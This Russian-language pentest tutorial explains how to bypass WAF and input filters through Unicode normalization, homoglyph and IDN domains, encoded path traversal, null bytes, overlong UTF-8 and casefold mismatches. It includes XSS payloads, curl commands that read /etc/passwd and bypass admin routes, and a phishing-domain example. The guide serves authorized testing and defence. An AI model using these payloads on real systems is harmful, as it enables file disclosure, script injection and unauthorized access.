Unicode-нормализация, гомоглифы, path override и null-байты — это техники обхода фильтров за счёт расхождений в том, как разные компоненты **декодируют и нормализуют** строки. Фильтр WAF сравнивает байты/строки одним способом, а приложение декодирует иначе — и вредоносная последовательность проходит. Это «второй эшелон» после базового URL-кодирования, и часто именно он ломает, казалось бы, строгие проверки.

## Теория: нормализация Unicode

Unicode позволяет представить один и тот же символ несколькими способами. Формы нормализации:

| Форма | Что делает |
|-------|-----------|
| NFC | каноническая композиция |
| NFD | каноническая декомпозиция |
| NFKC | совместимостная композиция (схлопывает варианты) |
| NFKD | совместимостная декомпозиция |

Если WAF проверяет **до** нормализации, а приложение **после** (или наоборот), возникает обход. Ключевые символы-обманки: `．` (U+FF0E), `。` (U+3002), `⁄` (U+2044), `﹤` (U+FE64), `＜` (U+FF1C).

## Техника 1: NFKC-обход

Символы, которые NFKC превращает в опасные ASCII:

```text
＜script＞        (U+FF1C/U+FF1E)  -> NFKC -> <script>
ｓｅｌｅｃｔ       (fullwidth)       -> select
℮               -> e
```

Если WAF не применяет NFKC, а браузер/бэкенд — применяет, XSS/SQLi проходит:

```text
＜img src=x onerror=alert(1)＞
```

## Техника 2: homoglyph / IDN

Визуально одинаковые символы из разных алфавитов:

- Кириллица: `а`(U+0430), `е`(U+0435), `о`(U+043E), `р`(U+0440), `с`(U+0441), `х`(U+0445).
- Греческий: `Α`, `Β`, `Ε`, `Ο`, `Ρ`.

Примеры: `раypal.com` (кириллическая `р`), `trusted.com` с латинской/кириллической путаницей. В URL-контексте IDN-домены конвертируются в punycode (`xn--...`) — проверяйте, что фильтр работает с punycode, а не с «красивой» строкой. Для обхода allowlist: `trusted.com` vs `trusted．com` (идеографическая точка U+FF0E).

## Техника 3: path override / dot-segments

- `..%2f`, `%2e%2e%2f`, `%252e%252e%252f` (двойное кодирование).
- `....//` (фильтр удаляет `../` один раз → остаётся `../`).
- `..%c0%af` (overlong-представление `/`).
- `..%5c` (обратный слэш).
- `/%2e%2e/%2e%2e/etc/passwd`.
- Абсолютный путь: `/etc/passwd`, `file:///etc/passwd`.

## Техника 4: null byte

`%00` (NUL) в старых движках (C-строки, PHP < 5.3.4) обрезал строку:

```text
../../etc/passwd%00.png
shell.php%00.jpg
```

Современные версии обычно закрыты, но в Java/.NET-биндингах/старых библиотеках встречается.

## Техника 5: overlong UTF-8

Неканоничное кодирование ASCII-символа несколькими байтами:

```text
/   -> %c0%af   (overlong)
.   -> %c0%ae
<   -> %c0%bc
```

Некоторые декодеры «прощают» overlong и получают `/`, `.`, `<` — обход фильтра.

## Техника 6: zero-width и управляющие

- Zero-width: U+200B, U+200C, U+200D, U+FEFF — невидимы, могут разрывать сигнатуры.
- RTL override: U+202E меняет направление отображения (`exe.txt` → `txt.exe` визуально).
- Управляющие: `%09` (tab), `%0a` (LF), `%0d` (CR) — иногда разрывают токен.

Пример: `java%0ascript:` (LF в схеме) — старый обход XSS-фильтров.

## Разобранный пример: обход path-фильтра

Фильтр блокирует `../`. Обход:

```bash
curl -s --path-as-is "https://app.example/download?f=....//....//etc/passwd"
curl -s --path-as-is "https://app.example/download?f=..%2f..%2fetc%2fpasswd"
curl -s --path-as-is "https://app.example/download?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
curl -s --path-as-is "https://app.example/download?f=..%c0%af..%c0%afetc%c0%afpasswd"
```

Проверяйте каждую вариацию отдельно (Burp Intruder, не цикл).

## Разобранный пример: обход XSS-фильтра NFKC

Фильтр блокирует `<script>`, но не нормализует NFKC:

```html
＜script＞alert(1)＜/script＞
```

Если бэкенд нормализует (например, `.normalize('NFKC')` в Node или ICU в Java), теги станут настоящими и сработают в браузере. Проверяйте, как именно приложение нормализует.

- **`CyberChef`** — быстрая проверка NFKC/NFKD/homoglyph.
- **`Burp Intruder`** — перебор вариаций.
- **`unicode-tools`/`idna` (Python)** — punycode/нормализация.
- **`ffuf`** — параметр-фаззинг с разными кодировками.
- **`Wappalyzer`/`httpx`** — определить, где нормализуется.

## Что дальше / decision

1. Фильтр блокирует опасную строку → пробуйте NFKC/fullwidth/homoglyph.
2. Path-фильтр → `....//`, двойное кодирование, overlong.
3. Старый стек → null byte/overlong.
4. URL/IDN → punycode и идеографические точки.
5. Сработало → зафиксируйте точную последовательность как PoC.

## Частые ошибки

- **Кодировать один раз.** Часто нужно двойное/тройное кодирование.
- **Забыть про нормализацию бэкенда.** NFKC может «оживить» безобидный ввод.
- **Использовать curl без `--path-as-is`.** `..` нормализуется клиентом.
- **Путать NFC и NFKC.** NFKC агрессивнее — чаще даёт обход.
- **Ломать прод.** Только с согласия.

## Полная таблица: нормализация по формам Unicode

Unicode-нормализация приводит разные последовательности к одной. Расхождение между «нормализующим» валидатором и «ненормализующим» потребителем — суть байпаса.

| Форма | Что делает | Пример |
|-------|-----------|--------|
| NFC | каноническая композиция | `e`+`´` → `é` |
| NFD | каноническая декомпозиция | `é` → `e`+`´` |
| NFKC | совместимостная композиция | `ﬁ` → `fi`, `①` → `1` |
| NFKD | совместимостная декомпозиция | `ﬁ` → `f`+`i` |
| Casefold | регистронезависимая нормализация | `ß` → `ss`, `İ` → `i̇` |

Опасность: NFKC превращает «полноширинные» и лигатурные символы в ASCII. Если фильтр проверяет строку **до** NFKC, а база/парсер применяет NFKC **после** — фильтр обходится.

```python
import unicodedata
print(unicodedata.normalize('NFKC', '＜script＞'))   # <script>
print(unicodedata.normalize('NFKC', 'ｓｅｌｅｃｔ'))     # select
```

## Homoglyph и IDN: визуальная подмена

Гомоглифы — символы, визуально неотличимые от ASCII, но с другими кодами. Работают в фишинге и в обходе сравнений.

```text
a  U+0061  vs  а  U+0430 (кириллица)
o  U+006F  vs  о  U+043E (кириллица)
l  U+006C  vs  1  U+0031
rn             vs  m
```

IDN-домены: `аpple.com` (кириллическая `а`) — визуально `apple.com`, но другой домен. Для теста:

```bash
# punycode-представление
python3 -c "print('аpple.com'.encode('idna'))"   # xn--pple-43d.com
# браузер покажет его как аpple.com -> фишинг/обход allowlist по строке
```

Обход allowlist: если приложение сравнивает домен как строку до IDNA-нормализации, `xn--...`-вариант может проскочить.

## Path override и dot-segments: обход маршрутизации

Разные слои (CDN, прокси, фреймворк) по-разному трактуют `..`, `//`, `;`, `%2e%2e`.

```text
/admin/..;/public          # Tomcat ; + .. -> path confusion
/%2e%2e/%2e%2e/etc/passwd  # закодированные dot-segments
//admin                     # двойной слэш -> нормализация в /admin
/./admin                   # текущая директория
/admin%2f..%2fpublic
```

```bash
# проверка обхода авторизации на маршруте
curl -s 'https://app.example/admin/..;/public' -o /dev/null -w '%{http_code}\n'
curl -s 'https://app.example/public/../admin' -o /dev/null -w '%{http_code}\n'
```

Если WAF/прокси блокирует `/admin`, а фреймворк после нормализации всё равно роутит в админку — доступ обойдён.

## Null byte, overlong UTF-8 и управляющие символы

```text
%00          -> обрыв строки в C-функциях (старые версии)
%C0%AE       -> overlong-кодирование '.' (обход наивных фильтров)
%C0%80       -> overlong NUL
%E2%80%8B    -> zero-width space (невидимый разделитель)
%EF%BB%BF    -> BOM
%0d%0a       -> CRLF
```

```bash
# null byte в имени файла/параметре
curl -s 'https://app.example/file.php?name=shell.php%00.jpg'
# zero-width между символами ключевого слова
curl -s 'https://app.example/?q=se%E2%80%8Blect'
```

Фильтры на основе регулярных выражений «проскакивают» невидимые символы, а бэкенд затем нормализует или удаляет их, получая валидный payload.

## Что делать дальше / решение

1. **Найдите фильтр.** Что именно проверяется (regex? allowlist? сравнение строк?).
2. **Проверьте форму нормализации.** Делает ли валидатор NFC/NFKC — и делает ли потребитель.
3. **Подберите расхождение.** NFKC-обход, гомоглиф, IDN, dot-segments.
4. **Проверьте обход маршрутизации.** `..;/`, `%2e%2e`, `//`.
5. **Проверьте невидимые символы.** Zero-width, BOM, overlong.
6. **Зафиксируйте PoC.** Строка + наблюдаемый обход (доступ, инъекция, XSS).

## Casefold и турецкая «i»: тонкий байпас

Регистронезависимая нормализация (casefold) не всегда совпадает с тем, что делает фильтр. Классика — турецкая `İ`/`ı` и немецкая `ß`.

```python
'İ'.casefold()      # 'i̇'  (i + combining dot) — не равно 'i'
'ß'.casefold()      # 'ss'
'K'.casefold()      # 'k'
```

Если приложение сравнивает логин/роль через `casefold`, а фильтр — через `lower()`, возникает расхождение: `ADMİN` может не совпасть с запрещённым `admin` на этапе фильтра, но совпасть после casefold у потребителя.

| Строка | `lower()` | `casefold()` |
|--------|-----------|--------------|
| `İ` | `i̇` | `i̇` |
| `ß` | `ß` | `ss` |
| `Σ` | `σ` | `σ` |
| `ǅ` | `ǆ` | `ǆ` |

Проверяйте оба преобразования и их порядок относительно валидации — это ещё один источник расхождений, наряду с NFC/NFKC.

## Сводка: где искать расхождение нормализации

| Слой | Что делает | Типичный баг |
|------|-----------|--------------|
| WAF | нормализует для проверки | проверяет «сырое», потребитель — нормализованное |
| Роутер | нормализует путь | `..;/`, `%2e%2e` |
| Фреймворк | декодирует параметры | двойное декодирование |
| БД | сравнивает с collation | регистронезависимое сравнение |
| Файловая система | регистронезависима (Windows) | `Admin` == `admin` |
| Фронтенд | `toLowerCase()` в JS | `İ` не сворачивается |

Правило: **нормализуйте один раз, в одном месте, до валидации** — и проверяйте, что все слои используют один и тот же результат.
